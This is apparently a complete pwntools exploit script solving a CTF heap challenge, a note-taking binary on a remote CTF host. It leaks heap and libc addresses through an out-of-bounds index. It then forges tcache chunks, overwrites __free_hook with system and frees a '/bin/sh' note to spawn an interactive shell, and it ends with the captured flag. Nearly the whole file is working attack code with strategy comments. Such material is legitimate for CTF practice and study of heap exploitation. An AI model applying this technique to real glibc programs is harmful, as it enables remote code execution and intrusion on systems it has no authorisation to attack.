#!/usr/bin/env python3

import chunk
from pwn import *
import time

# 2 notes at most.
# max allocation size 0x200

exe = ELF('./challenge/chall')
libc = ELF('./lib/libc.so.6')

#context.log_level = 'debug'

#p = process([exe.path], env={'LD_PRELOAD': 'lib/libc.so.6'})
p = remote('pwn.chal.ctf.gdgalgiers.com', 1405)
# encode content
def create_note(size, content):
    p.sendline('1')
    p.sendlineafter("Size:", str(size).encode())
    p.sendlineafter("Note content:", content)

# free note vuln:- take our index for freeing.
# free(*(undefined8 *)(entries + (uint64_t)var_ch * 8));

def free_note(index):
    p.sendline('2')
    p.sendline(str(index))

# Arbitiary read
# *(int64_t *)(entries + (int64_t)var_ch * 8) != 0 then read will happen
def view_note(index):
    p.sendline('4')
    p.sendlineafter("Index:", str(index))
    address = p.recvline()
    return address

# Stratergy

# * Allocate two chunks one of size 0x100 other also of 0x50
# * Make a fake chunk of huge size that end in unsorted bin
# * View the first chunk we will get libc leak
# * Make another fake chunk inside it which should end in tcache bin
# * Free this fake chunk
# * Write a free
# * Reallocate 1st one with no content.
# * view it

try:
    input('>')
    fake_chunk = p64(0) + p64(0x41) + b"C" * 20
    create_note(0x30, fake_chunk)
    create_note(0x30, b"A" * 0x10)
    
    heap_leak = view_note(0)[26:]
    heap_address = int(heap_leak[:14].decode(), 0)
    print("Chunk Location: 0x%x" % heap_address)

    entries_leak = view_note(-9)[26:]
    entries_address= int(entries_leak[:14].decode(), 0) + 8 * 9
    print("Entries location: 0x%x" % entries_address)

    address = view_note(-25)[26:]
    puts_leak = int(address[:14].decode(), 0)
    libc.address = puts_leak - libc.sym['puts']
    print("Libc: 0x%x" % libc.address)

    # Clearing everything
    free_note(1)
    free_note(0)

    # Staratergy
    # Make a big chunk of 0x200 bytes by name P.
    # Split it in 3 equal parts with a little more padding at end (padding optional).
    # free the second chunk let call it B by calculating offset.
    # free the P, chunk of 0x200 bytes
    # Now B is tcahe and P is also in tchahe, malloc a chunk of P size again
    # Now B is writable
    new_chunk = heap_address + 128
    chunk_to_free = new_chunk

    chunk1 = p64(0) + p64(0x31) + p64(0) * 4
    chunk2 = p64(0) + p64(0x31) + p64(new_chunk + 64) + p64(0) * 3  
    main_chunk = chunk1 + chunk2 + chunk1 + p64(0) + p64(0x21)
    create_note(0x200, main_chunk)
    create_note(0x200, "DUMMY")

    offset = (new_chunk + 64 - entries_address) /8
    print("offset: %d" % offset)
    time.sleep(1)
    free_note(offset)
    free_note(0)
    create_note(0x200, b"A" * (64 -16) + p64(0) + p64(0x31) + p64(libc.sym['__free_hook']))
    #input('>')
    time.sleep(0.7)
    #free_note(0)
    free_note(1)
    create_note(0x20, "/bin/sh\x00")
    create_note(0x20, p64(libc.sym['system']))
    input('>')
    free_note(0)
    # def fill_tchache(chunk_size):
    #     payload1 = p64(0) + p64()
    #     create_note(0x200, "A")
#    print("Double Freeing: 0x%x" % (int(entries_address + offset_for_free * 8)))

    p.interactive()
#    create_note(0x50, "B" * 0x50)
#    free_note(1)
#    create_note()
except Exception as e:
    print(e)

# Flag:- CyberErudites{1t$_n0t_1h4t_s3cur3_r1ght?}
